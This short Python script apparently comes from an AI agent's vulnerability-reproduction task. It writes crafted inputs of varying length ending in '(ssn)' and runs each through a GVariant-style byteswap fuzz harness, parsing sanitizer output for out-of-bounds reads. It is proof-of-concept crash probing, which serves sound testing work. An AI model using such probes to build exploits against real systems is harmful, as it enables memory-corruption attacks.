extras.code:
import subprocess, os, re, binascii
bin='/workspace/repo-vul/work-vul/meson/fuzzing/fuzz_variant_binary_byteswap'
for L in [1,2,3,4,10,255,256,257,300]:
    p=f'/tmp/poc{L}'
    open(p,'wb').write(b'A'*L + b'\x00(ssn)')
    r=subprocess.run([bin,p],cwd='/workspace',stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=5)
    out=r.stdout.decode('latin1','replace')
    m=re.search(r'READ of size (\d+)',out)
    print(L,'ret',r.returncode,'read',m.group(1) if m else None, out.split('\n')[2] if len(out.split('\n'))>2 else '')
